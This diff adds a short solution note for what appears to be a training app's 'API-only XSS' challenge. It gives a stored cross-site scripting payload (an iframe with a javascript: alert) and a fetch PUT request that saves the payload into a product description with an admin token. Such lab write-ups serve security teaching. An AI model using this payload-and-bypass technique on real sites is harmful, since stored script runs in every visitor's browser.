@@ -1,0 +1,16 @@
+JUICE-004 - Stored XSS in a product (API only)
+Endpoint: PUT /api/Products/1  (needs the admin token from JUICE-001)
+
+Send this as the product description:
+
+<iframe src="javascript:alert(`xss`)">
+
+The UI blocks it but the API doesn't, so it gets saved. After that it runs
+every time someone opens that product. Solves the "API-only XSS" challenge.
+
+Example request:
+  fetch('/api/Products/1', {
+    method:'PUT',
+    headers:{'Content-Type':'application/json','Authorization':'Bearer <TOKEN>'},
+    body: JSON.stringify({description:'<iframe src="javascript:alert(`xss`)">'})
+  })
